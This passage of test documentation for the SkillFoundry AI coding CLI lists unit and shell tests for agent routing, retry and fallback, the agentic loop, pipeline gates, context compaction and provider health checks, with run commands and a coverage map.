| 7 | Show info | `/agent info coder` | Displays name, category, tools, prompt | Users can inspect agent capabilities |
| 8 | Reject info for unknown | `/agent info nonexistent` | Error message | No crash on invalid info request |
| 9 | Usage when no name | `/agent info` (missing name) | Usage hint | Helpful error for incomplete commands |

**Value:** The agent command is how users manually control which AI persona is active. Poor UX here means users can't leverage the 60-agent system.

---

### 18. team-router.test.ts — 16 tests

**Source:** `sf_cli/src/core/team-router.ts`
**What it protects:** Automatic message-to-agent routing based on keyword matching

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | "implement login" → coder | `routeMessage('implement login', team)` | `{ agent: 'coder', confidence: ... }` | Implementation requests go to coder |
| 2 | "unit tests" → tester | Route message | `{ agent: 'tester' }` | Test requests go to tester |
| 3 | "fix bug" → fixer | Route message | `{ agent: 'fixer' }` | Bug reports go to fixer |
| 4 | "review PR" → review | Route message | `{ agent: 'review' }` | Review requests go to reviewer |
| 5 | "review code" → review not coder | Route message | `{ agent: 'review' }` | "review" keyword beats "code" keyword |
| 6 | "debug stack trace" → debugger | Route message | `{ agent: 'debugger' }` | Debug requests go to debugger |
| 7 | Fallback for ambiguous | Route vague message | Falls back to first team member | Always returns an agent |
| 8 | High confidence | Route with strong keyword match | `confidence > 0.7` | Strong matches are confident |
| 9 | Medium confidence | Route with weak match | `0.3 < confidence < 0.7` | Ambiguous matches show uncertainty |
| 10 | Empty message | Route `""` | Returns fallback agent | No crash on empty input |
| 11 | Only team members scored | Route with non-team agents | Only team agents considered | Routing respects team boundaries |
| 12 | Tie-breaking | Route with equal-weight matches | Deterministic winner | No random behavior |
| 13 | Security team preset | Load security team | Contains security-related agents | Preset teams are correctly composed |
| 14 | Ops team preset | Load ops team | Contains ops-related agents | Same for ops preset |
| 15 | Keyword validation | All patterns in all agents | Valid RegExp objects | No broken regex patterns crash routing |
| 16 | All patterns are valid RegExp | Compile every pattern | No throws | Regex compilation safety |

**Value:** Team routing is what makes `/team activate dev-core` work — messages automatically go to the right specialist. Wrong routing means the coder gets security questions and the tester gets implementation requests.

---

### 19. team-command.test.ts — 11 tests

**Source:** `sf_cli/src/commands/team.ts`
**What it protects:** The `/team` slash command for managing agent teams

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | No args, no team | `/team` when no team active | "No team active" message | Correct empty state display |
| 2 | No args, with team | `/team` when team is set | Shows team name and members | Current team visible |
| 3 | Activate preset | `/team activate dev-core` | Team set with correct members | Preset team activation works |
| 4 | Unknown team error | `/team activate nonexistent` | Error with available preset list | Helpful error for typos |
| 5 | Custom team | `/team custom coder,tester,fixer` | Team set with those 3 agents | Users can compose custom teams |
| 6 | Custom needs 2+ agents | `/team custom coder` | Error: minimum 2 agents | Teams must have multiple members |
| 7 | Unknown agents in custom | `/team custom coder,nonexistent` | Error listing unknown agents | Bad agent names caught early |
| 8 | Dismiss with off | `/team off` | Team cleared | Users can deactivate team routing |
| 9 | List presets | `/team list` | Shows all preset teams with members | Users can browse available teams |
| 10 | Status with team | `/team status` when team set | Shows team and routing info | Team status inspectable |
| 11 | Status without team | `/team status` when no team | "No team active" | Correct empty state |

**Value:** Team management is the high-level orchestration layer — users pick a team instead of individual agents, and the router handles delegation.

---

### 20. retry.test.ts — 6 tests

**Source:** `sf_cli/src/core/retry.ts`
**What it protects:** API call retry logic with fallback provider support

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | First success returns | Mock succeeds immediately | Returns result, 1 call total | Happy path: no wasted retries |
| 2 | Retry on 503, succeed | Mock fails once (503), then succeeds | Returns result after 2 calls | Transient server errors recovered |
| 3 | No retry on 401 | Mock fails with 401 | Immediately falls to fallback (no retry) | Auth errors aren't retryable — don't waste time |
| 4 | Fallback after exhaustion | Mock fails 3x (503), fallback succeeds | Returns fallback result | Primary provider down → fallback kicks in |
| 5 | Both fail throws | Primary and fallback both fail | Throws error | Clear failure when everything is down |
| 6 | No fallback throws | Primary fails, no fallback configured | Throws error | No silent failure without fallback |

**Value:** Retry + fallback is what makes the CLI resilient to API outages. Without it, a single 503 from Anthropic would crash the session.

---

### 21. ai-runner.test.ts — 8 tests

**Source:** `sf_cli/src/core/ai-runner.ts`
**What it protects:** The extracted agentic loop — multi-turn AI tool use without React dependencies

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Single-turn text | Mock provider returns text only | `RunnerResult` with `content`, `turnCount: 1` | Simple Q&A works |
| 2 | Multi-turn tools | Mock returns tool_use → executor runs → final text | Result after 2+ turns | AI can use tools across turns |
| 3 | Budget exceeded | `checkBudget()` returns false | Loop stops, result has `aborted: false` but partial | Financial safety net stops runaway loops |
| 4 | Permission denied | `requestPermission` callback returns `'deny'` | Tool result is error, AI sees denial | User can block individual tool calls |
| 5 | Max turns reached | Set `maxTurns: 2`, mock returns tools every turn | Stops at turn 2, returns last content | Infinite loops prevented |
| 6 | Abort signal | Set `abortSignal.aborted = true` mid-loop | Returns early with `aborted: true` | Users can cancel long-running operations |
| 7 | Callbacks fire | Provide `onToolStart`/`onToolComplete` | Both called with correct arguments | UI can show real-time tool execution progress |
| 8 | Pre-flight budget fail | `checkBudget()` fails before first turn | Returns immediately, 0 turns | No API calls when budget is already exceeded |

**Mocked dependencies:** `createProvider`, `executeTool`, `checkBudget`, `recordUsage`, `loadUsage`

**Value:** The ai-runner is the **core engine** that drives all AI interactions — both interactive chat and the Forge pipeline. A bug here means the AI either can't use tools, runs forever, or ignores safety limits.

---

### 22. pipeline.test.ts — 16 tests

**Source:** `sf_cli/src/core/pipeline.ts`
**What it protects:** The Forge pipeline engine — PRD→stories→implementation→gates→debrief

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | scanPRDs empty | Scan empty genesis/ | `[]` | No crash on empty project |
| 2 | scanPRDs finds PRDs | Create `.md` files in genesis/ | Finds all PRD files | Pipeline discovers work items |
| 3 | scanPRDs excludes TEMPLATE | Create TEMPLATE.md in genesis/ | Not in results | Template not treated as real PRD |
| 4 | scanStories empty | Scan empty stories dir | `{ total: 0, completed: 0 }` | Handles no stories |
| 5 | scanStories counts | Create stories with status markers | Correct total and completed counts | Progress tracking accuracy |
| 6 | IGNITE fails with no PRDs | `runPipeline()` on empty genesis/ | Phase 1 FAILED, pipeline halts | No PRDs = no work = clear error |
| 7 | Skips generation with existing stories | PRD + existing stories in docs/ | PLAN phase skipped, FORGE executes | Doesn't regenerate already-existing stories |
| 8 | Generates stories from PRD | PRD exists, no stories yet | AI called to generate stories, files created | Story generation from PRD works |
| 9 | Fixer retry on T1 fail | Story produces code with banned patterns | Fixer agent called, T1 re-run | Auto-remediation of quality issues |
| 10 | Failed after fixer exhaustion | Story fails T1, fixer fails 2x | Story marked as failed, pipeline continues | Max retries respected, pipeline doesn't hang |
| 11 | Run metadata persisted | Full pipeline run | `.skillfoundry/runs/{id}.json` written | Run history for auditing and replay |
| 12 | Pipeline callbacks fire | Provide `onPhaseStart`/`onStoryComplete` callbacks | All callbacks called at correct points | UI shows real-time pipeline progress |
| 13 | Post-story micro-gates run | Story executes, check `runPostStoryGates` called | MG1+MG2 results in `microGateSummary` | Micro-gates integrated into pipeline flow |
| 14 | Micro-gate FAIL triggers fixer | MG1 returns FAIL, T1 passes | Fixer agent invoked with micro-gate findings | Cross-agent enforcement works |
| 15 | Micro-gate callbacks fire | Provide `onMicroGateResult` callback | Callback called for MG1, MG2, MG3 | UI shows micro-gate progress in real time |
| 16 | MG3 advisory does not block | MG3 returns FAIL, T1-T6 pass | Pipeline verdict is PASS, advisory recorded | Advisory gates are informational only |

**Value:** The pipeline is the top-level orchestrator that turns PRDs into production code. It coordinates AI, tools, gates, micro-gates, and persistence — a bug here breaks the entire Forge workflow.

---

### 23. compaction.test.ts — 20 tests

**Source:** `sf_cli/src/core/compaction.ts`
**What it protects:** Context window management for local models with small context windows

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | estimateTokens 3.5 ratio | `estimateTokens('hello world')` | ~`11/3.5` ≈ 3 | Token estimation works for budget checks |
| 2 | estimateTokens empty | `estimateTokens('')` | `0` | No crash on empty input |
| 3 | Custom ratio | `estimateTokens(text, 4.0)` | Different result than 3.5 | Per-model ratio tuning |
| 4 | Long text | `estimateTokens(longString)` | Proportional result | Scales linearly with content |
| 5 | Known model context | `getContextWindow('qwen2.5-coder:7b')` | `32768` | Model-specific limits known |
| 6 | Unknown model | `getContextWindow('unknown-model')` | `4096` (conservative default) | Safe fallback for unknown models |
| 7 | Config override | `getContextWindow(model, 16000)` | `16000` | Users can set custom limits |
| 8 | Zero override ignored | `getContextWindow(model, 0)` | Model default, not 0 | Zero is "not set", not "no context" |
| 9 | isLocalProvider true | `isLocalProvider('ollama')` | `true` | Correct classification |
| 10 | isLocalProvider false | `isLocalProvider('anthropic')` | `false` | Cloud providers not local |
| 11 | System prompt within budget | System prompt fits in context | Returned unchanged | Don't compact what fits |
| 12 | Remove code blocks | System prompt over budget, has code blocks | Code blocks removed first | Least-important content removed first |
| 13 | Hard truncate | Even without code blocks, still over | Truncated to fit | Last resort: hard cut |
| 14 | Messages within budget | Messages fit in context window | Returned unchanged | Don't compact what fits |
| 15 | Over budget compaction | Messages exceed context | Older messages summarized | Conversation history compressed |
| 16 | Inject summary | Compaction with summary injection | Summary message prepended | Context includes "what happened before" |
| 17 | Disabled summary | `injectSummary: false` | No summary message added | Configurable behavior |
| 18 | Compress system prompt | Messages + system prompt over budget | System prompt also compressed | Both system and messages can be compacted |
| 19 | Keep recent messages | Large conversation compacted | Last N messages preserved verbatim | Recent context always available to AI |
| 20 | Very large conversation | 100+ messages | Compacts to fit, recent preserved | Handles real-world long sessions |

**Value:** Local models (Ollama, LM Studio) often have 4K-32K context windows vs 200K for cloud. Without compaction, conversations crash after a few turns. This module is what makes local-first development viable.

---

### 24. health-check.test.ts — 13 tests

**Source:** `sf_cli/src/core/health-check.ts`
**What it protects:** Provider health monitoring and automatic fallback routing

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | isLocalProvider ollama | `isLocalProvider('ollama')` | `true` | Ollama identified as local |
| 2 | isLocalProvider lmstudio | `isLocalProvider('lmstudio')` | `true` | LM Studio identified as local |
| 3 | isLocalProvider cloud | `isLocalProvider('anthropic')` | `false` | Cloud providers not local |
| 4 | Default base URL ollama | `getLocalBaseUrl('ollama')` | `'http://localhost:11434'` | Correct default port |
| 5 | Default base URL lmstudio | `getLocalBaseUrl('lmstudio')` | `'http://localhost:1234'` | Correct default port |
| 6 | Non-local returns null | `getLocalBaseUrl('anthropic')` | `null` | Cloud providers have no local URL |
| 7 | Env override | Set `OLLAMA_BASE_URL`, get URL | Returns env value | Custom deployments supported |
| 8 | Cloud always healthy | `pingProvider('anthropic')` | `true` | Cloud assumed reachable (checked at request time) |
| 9 | Local offline | `pingProvider('ollama')` (no server running) | `false` | Detects when local provider is down |
| 10 | Health caching | Ping twice within cache TTL | Second call uses cache | Avoids hammering local servers |
| 11 | Cloud direct routing | `resolveProvider('anthropic', ...)` | `{ provider: 'anthropic' }` | Cloud providers route directly |
| 12 | Local offline fallback | `resolveProvider('ollama', ...)` with fallback | `{ provider: 'anthropic' }` | Automatically falls back when local is down |
| 13 | No fallback warning | `resolveProvider('ollama', ...)` without fallback | `{ provider: 'ollama', warning: '...' }` | Warns but still returns local (user chose no fallback) |

**Value:** Health checks prevent the CLI from sending requests to a local provider that's not running. Without this, users get cryptic connection errors instead of automatic fallback to cloud.

---

### 25. task-classifier.test.ts — 15 tests

**Source:** `sf_cli/src/core/task-classifier.ts`
**What it protects:** Task complexity classification for local-first routing decisions

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Documentation → simple | `classifyTask('update the README')` | `'simple'` | Docs tasks routed to local (cheaper) |
| 2 | Formatting → simple | `classifyTask('format the code')` | `'simple'` | Formatting is mechanical, local can handle it |
| 3 | Explanation → simple | `classifyTask('explain this function')` | `'simple'` | Explanations don't need strong reasoning |
| 4 | Architecture → complex | `classifyTask('design the auth system')` | `'complex'` | Architecture needs powerful models |
| 5 | Security → complex | `classifyTask('audit for vulnerabilities')` | `'complex'` | Security analysis needs deep reasoning |
| 6 | Refactoring → complex | `classifyTask('refactor the database layer')` | `'complex'` | Large-scale refactoring needs context understanding |
| 7 | Both keywords → complex | `classifyTask('explain the architecture')` | `'complex'` | Ambiguous → defaults to complex (safety) |
| 8 | No keywords → complex | `classifyTask('do the thing')` | `'complex'` | Unknown tasks default to powerful model (safety) |
| 9 | README → simple | `classifyTask('update readme')` | `'simple'` | Common simple task recognized |
| 10 | Test writing → complex | `classifyTask('write unit tests')` | `'complex'` | Test creation needs understanding |
| 11 | Simple → local provider | `selectProvider('simple', ...)` with healthy local | Local provider returned | Simple tasks save money on local |
| 12 | Complex → cloud provider | `selectProvider('complex', ...)` | Cloud provider returned | Complex tasks get best model |
| 13 | Unhealthy local → cloud | `selectProvider('simple', ...)` with offline local | Cloud provider returned | Graceful degradation |
| 14 | Routing disabled → cloud | `selectProvider('simple', ...)` with `route_local_first: false` | Cloud provider returned | Config respected |
| 15 | Unknown provider → cloud | `selectProvider('simple', ...)` with unknown local | Cloud provider returned | Safe fallback for misconfiguration |

**Value:** Task classification is the intelligence layer that decides whether to use a free local model or a paid cloud model. Misclassification either wastes money (routing simple tasks to cloud) or produces poor results (routing complex tasks to local).

---

### 26. micro-gates.test.ts — 16 tests

**Source:** `sf_cli/src/core/micro-gates.ts`
**What it protects:** Post-handoff AI micro-gates — lightweight security, standards, and cross-story review at pipeline handoff points

| # | Test | How | Expected Result | Value |
|---|------|-----|-----------------|-------|
| 1 | Parse clean PASS | Feed `VERDICT: PASS` response | `verdict: 'PASS'`, empty findings | Happy path parsing works |
| 2 | Parse FAIL with findings | Feed FAIL response with `[HIGH]` and `[MEDIUM]` findings | Both findings extracted with severity, description, location | Multi-finding extraction accurate |
| 3 | Parse WARN response | Feed `VERDICT: WARN` with `[LOW]` finding | `verdict: 'WARN'`, 1 finding | Warning level parsed correctly |
| 4 | Unparseable → WARN | Feed free-form text (no VERDICT) | `verdict: 'WARN'`, no findings | Conservative default on bad AI output |
| 5 | PASS + CRITICAL → FAIL | Feed `VERDICT: PASS` with `[CRITICAL]` finding | Overridden to `verdict: 'FAIL'` | Safety override prevents false passes |
| 6 | PASS + HIGH → FAIL | Feed `VERDICT: PASS` with `[HIGH]` finding | Overridden to `verdict: 'FAIL'` | HIGH findings also trigger override |
| 7 | Finding without location | Feed finding with no `(file:line)` | `location: undefined` | Optional location handled gracefully |
| 8 | Malformed finding → MEDIUM | Feed finding without `[SEVERITY]` tag | `severity: 'MEDIUM'` | Fallback severity for untagged findings |
| 9 | MG1+MG2 run in sequence | Call `runPostStoryGates()` | Returns 2 results (MG1 security, MG2 standards) | Both post-story gates execute |
| 10 | Security FAIL propagated | MG1 returns FAIL response | Result has `verdict: 'FAIL'` with findings | Security gate blocks insecure code |
| 11 | Cost tracked per gate | Both gates return costs | `costUsd` matches per-gate values | Cost accounting accurate for budgets |
| 12 | MG3 with completed stories | Call `runPreTemperGate()` with story list | Returns MG3 result with `agent: 'review'` | Cross-story review runs at correct phase |
| 13 | REVIEW tools used | Inspect `runAgentLoop` call args | Tools contain read, glob, grep; `maxTurns: 3` | Micro-gates are read-only and bounded |
| 14 | All PASS → empty fixer text | Call `formatFindingsForFixer()` with all-PASS results | Returns `''` | No fixer action when everything passes |
| 15 | FAIL formatted for fixer | Call with FAIL result containing findings | Output includes gate name, severity, location | Fixer gets actionable context |
| 16 | WARN included, PASS excluded | Mixed results (1 PASS, 1 WARN) | Output contains WARN gate, omits PASS gate | Only actionable findings forwarded |

**Value:** Micro-gates are the cross-agent quality enforcement layer. They catch issues that individual agents miss — security blocks insecure code, standards blocks non-compliant code. Without these tests, a broken parser or missed override could let vulnerabilities through the pipeline.

---

## Shell Integration Tests

All shell tests live in `tests/` and use custom bash assertion functions.

---

### 1. run-tests.sh — ~167 tests

**Source:** `tests/run-tests.sh` (~3,657 lines)
**What it protects:** End-to-end framework integrity — files, scripts, configs, platform installs

**Testing approach:** Custom assertion framework with `log_success`/`log_failure`, test counters, isolated temp directories.

| Category | Tests | What It Validates | Value |
|----------|-------|-------------------|-------|
| **Version Management** | 3 | `.version` file exists, valid semver format, scripts read from it | Version consistency across the framework |
| **Installation** | 6+ | Claude/Copilot/Cursor/Gemini platform installs produce expected file structures | Multi-platform installation actually works |
| **Agent Protocol** | 2 | Reflection protocol exists and is referenced by key agents | Agents follow the standard protocol |
| **Integration Workflows** | 6 | Install→Update→Wizard flows complete without errors | End-to-end user journeys work |
| **Performance** | 2 | Install completes in < 5s, agent count is 20-100 | Framework isn't bloated or slow |
| **Security** | 2 | Anti-patterns docs exist, agents reference security standards | Security documentation is complete |
| **Cross-Platform** | 2 | Both `.sh` and `.ps1` variants exist for key scripts | Windows + Linux/Mac support |
| **Templates** | 2 | All 5 PRD templates present, contain `{{PROJECT_NAME}}` variables | Template system functional |
| **Parallel Execution** | 3 | Parallel scripts exist, are executable, support `--help` | Parallel dispatch infrastructure works |
| **Memory Bank** | 3 | Seed files present, valid JSON, bootstrap has ≥ 10 entries | Knowledge base initialized correctly |
| **Required Files** | 2 | All critical files and directories exist | Framework structure is complete |
| **Autonomous Mode** | 3 | settings.json has hooks, validate-bash.sh executable, blocks dangerous commands | Safety infrastructure in place |
| **Knowledge Exchange** | 8+ | harvest.sh, registry.sh, semantic-search.sh work | Knowledge pipeline functional |
| **Compliance** | 6+ | GDPR/HIPAA/SOC2 profiles with rules and checks scripts | Compliance infrastructure complete |
| **Session & Monitoring** | 8+ | Companion, attribution, session recorder, checkpoint scripts | Session lifecycle tooling works |
| **Advanced Features** | 10+ | Cost routing, quality primer, rejection tracker, A2A cards | Premium features functional |
| **CI/CD** | 3+ | GitHub Actions workflow valid, agent trace format correct | CI pipeline reliable |

---

### 2. test_sf_cli.sh — 21 tests

**What it protects:** The CLI binary (`sf`) end-to-end — every major command exercised against real state

| Test | What It Validates | Value |
|------|-------------------|-------|
| `sf version` | CLI starts and reports version | Binary works at all |
| `sf init` | Project initialization creates config | First-run experience works |
| `sf validate` | PRD validation pipeline | Gate-keeping for bad PRDs |
| `sf provider set/list` | Provider switching persists | Multi-provider workflow works |
| `sf policy check` | Policy file validation | Security policy enforced |
| `sf config set/get` | Config read/write cycle | User settings persist |
| `sf plan` | Plan generation with JSON contract | AI planning pipeline works |
| `sf apply` | Plan execution creates run | Implementation pipeline works |
| `sf runlog export` | Export produces output | Audit trail accessible |
| `sf runlog export (blocked)` | Policy blocks bad export paths | Security enforcement works |
| `sf memory + lessons` | Memory capture and recall | Knowledge persistence works |
| `sf tui line-mode` | TUI help system | Interactive mode works |
| `sf ask budget guard` | Budget=$0 blocks requests | Cost safety enforced |
| `sf ask json contract` | Provider routing returns JSON | API contract stability |
| `sf resume` | Session resumption | Long workflows survive restarts |
| `sf rollback` | Run deletion | Undo capability works |
| `sf clean` | Cleanup preserves important dirs | Safe cleanup behavior |
| `sf metrics` | Command tracking | Usage analytics work |

---

### 3. test_wave_a_framework.sh — 5 tests

**What it protects:** Wave A — Harvest engine, memory system, task queue foundations

| Test | What It Validates | Value |
|------|-------------------|-------|
| Harvest status JSON | Harvest engine returns valid structured data | Knowledge extraction works |
| Harvest project JSON | Multi-project aggregation | Cross-project learning |
| Swarm queue init/dedupe | Task queue with deduplication under file locks | Parallel task assignment works |
| Swarm queue recover | Invalid line removal and compaction | Queue self-healing |
| Queue status | Task counts and dedupe stats | Queue monitoring works |

---

### 4. test_wave_b_framework.sh — 3 tests

**What it protects:** Wave B — Memory sync and swarm coordination

| Test | What It Validates | Value |
|------|-------------------|-------|
| Memory sync JSON | Pull/push entries between projects and framework | Cross-project knowledge sharing |
| Swarm complete handoff | Task completion triggers scratchpad notes | Agent-to-agent communication |
| Handoff note contract | Priority and metadata in handoff notes | Structured agent coordination |

---

### 5. test_wave_c_framework.sh — 3 tests

**What it protects:** Wave C — Deduplication, promotion, and conflict detection

| Test | What It Validates | Value |
|------|-------------------|-------|
| Dedup signature + promotion | Signature generation detects near-duplicates | Knowledge deduplication works |
| Promotion review queue | Entries marked for promotion with counts | Knowledge curation pipeline |
| Conflict detection + lock release | Concurrent task claims trigger wave mode | Parallel safety mechanism |

---

### 6. test_wave_d_framework.sh — 4 tests

**What it protects:** Wave D — Escalation capture, dry-run, and review-only mode

| Test | What It Validates | Value |
|------|-------------------|-------|
| Escalation auto-capture | Decision entries with lineage and reviewer annotation | Audit trail for AI decisions |
| Go dry-run | No filesystem mutations in dry-run mode | Safe preview of changes |
| Go review-only | Report generation with finding counts | Read-only analysis mode |
| Dashboard escalations | Escalation state in dashboard display | Visibility into AI decision escalations |

---

### 7. test_wave_e_framework.sh — 7 tests

**What it protects:** Wave E — PRD diffing, semantic search, compliance, monorepo, metrics

| Test | What It Validates | Value |
|------|-------------------|-------|
| PRD diff | Maps PRD changes to impacted stories | Incremental re-implementation |
| Incremental run | Skips completed stories | Efficient re-runs |
| Semantic search | Relevance scoring for queries | Knowledge retrieval quality |
| Compliance scan | Secret and dependency scanning | Security compliance |
| Monorepo order | Workspace dependency resolution | Multi-package builds |
| Metrics trend | Delta calculation over time | Progress tracking |
| Template inherit | Base + overlay composition | Configuration inheritance |

---

### 8. test-agent-evolution.sh — 5 tests

**What it protects:** Agent evolution engine — the self-improvement loop

| Test | What It Validates | Value |
|------|-------------------|-------|
| Syntax check | Shell script is valid bash | No parse errors |
| Analyze command | Evolution analysis runs | Self-improvement engine works |
| Report generation | JSON report created | Audit trail of evolution |
| Report schema | Contains iteration, system_map, weak_points, risk_areas | Report structure valid |
| Stabilization flag | Risk stabilization tracking | Evolution doesn't regress |

---

## Test Architecture

### TypeScript Tests

```
sf_cli/src/__tests__/
├── Core Engine (8 files, 98 tests)
│   ├── config.test.ts          — Configuration loading/saving
│   ├── provider.test.ts        — AI provider management
│   ├── tools.test.ts           — Tool schema definitions
│   ├── executor.test.ts        — Tool execution engine
│   ├── permissions.test.ts     — Permission enforcement
│   ├── budget.test.ts          — Cost tracking/limits
│   ├── credentials.test.ts     — Secure credential storage
│   └── framework.test.ts       — Framework root/version
│
├── AI Pipeline (3 files, 30 tests)
│   ├── ai-runner.test.ts       — Multi-turn agentic loop
│   ├── retry.test.ts           — Retry + fallback logic
│   └── pipeline.test.ts        — Forge pipeline engine + micro-gate integration
│
├── Intelligence (5 files, 74 tests)
│   ├── intent.test.ts          — Chat vs agent classification
│   ├── agent-registry.test.ts  — 60-agent registry
│   ├── agent-command.test.ts   — /agent slash command
│   ├── team-router.test.ts     — Message→agent routing
│   └── team-command.test.ts    — /team slash command
│
├── Quality & Safety (4 files, 46 tests)
│   ├── gates.test.ts           — Anvil quality gates T1-T6
│   ├── micro-gates.test.ts     — Post-handoff AI micro-gates (MG1-MG3)
│   ├── redact.test.ts          — Secret redaction
│   └── diff.test.ts            — Diff parsing
│
├── Local-First (3 files, 48 tests)
│   ├── compaction.test.ts      — Context window management
│   ├── health-check.test.ts    — Provider health monitoring
│   └── task-classifier.test.ts — Task complexity routing
│
└── Features (3 files, 32 tests)
    ├── commands.test.ts        — Slash command parsing
    ├── forge.test.ts           — Forge PRD/story scanning
    └── memory.test.ts          — Persistent knowledge base
```

### Shell Tests

```
tests/
├── run-tests.sh                — Main framework validation (~167 tests)
├── test_sf_cli.sh              — CLI binary smoke tests (~21 tests)
├── test_wave_a_framework.sh    — Harvest + queue (~5 tests)
├── test_wave_b_framework.sh    — Sync + swarm (~3 tests)
├── test_wave_c_framework.sh    — Dedup + conflicts (~3 tests)
├── test_wave_d_framework.sh    — Dry-run + review (~4 tests)
├── test_wave_e_framework.sh    — Intelligence layer (~7 tests)
└── test-agent-evolution.sh     — Evolution engine (~5 tests)
```

---

## Running Tests

### TypeScript Unit Tests

```bash
cd sf_cli
npm test                    # Run all 328 tests
npm run test:watch          # Watch mode for development
npx vitest run --reporter=verbose  # Detailed output
npx vitest run src/__tests__/permissions.test.ts  # Single file
```

### Shell Integration Tests

```bash
cd tests
bash run-tests.sh           # Run all ~198 shell tests
bash test_sf_cli.sh         # CLI smoke tests only
bash test_wave_a_framework.sh  # Wave A only
```

### Full Suite

```bash
# From project root
cd sf_cli && npm test && cd ../tests && bash run-tests.sh
```

---

## Coverage Map

| System Component | Unit Tests | Integration Tests | Total |
|-----------------|------------|-------------------|-------|
| Configuration & Setup | 30 | 10+ | 40+ |
| AI Providers | 14 | 3+ | 17+ |
| Tool Execution | 28 | 5+ | 33+ |
| Permissions & Safety | 29 | 5+ | 34+ |
| Quality Gates | 28 | 10+ | 38+ |
| AI Pipeline | 30 | 5+ | 35+ |
| Agent System | 60 | 10+ | 70+ |
| Memory & Knowledge | 10 | 15+ | 25+ |
| Local-First | 48 | 3+ | 51+ |
| Forge Pipeline | 21 | 10+ | 31+ |
| Utilities | 30 | 15+ | 45+ |
| Framework Infra | 9 | 100+ | 109+ |
| **Total** | **328** | **198+** | **526+** |


---

_Generated: 2026-02-27 | SkillFoundry v2.0.14_
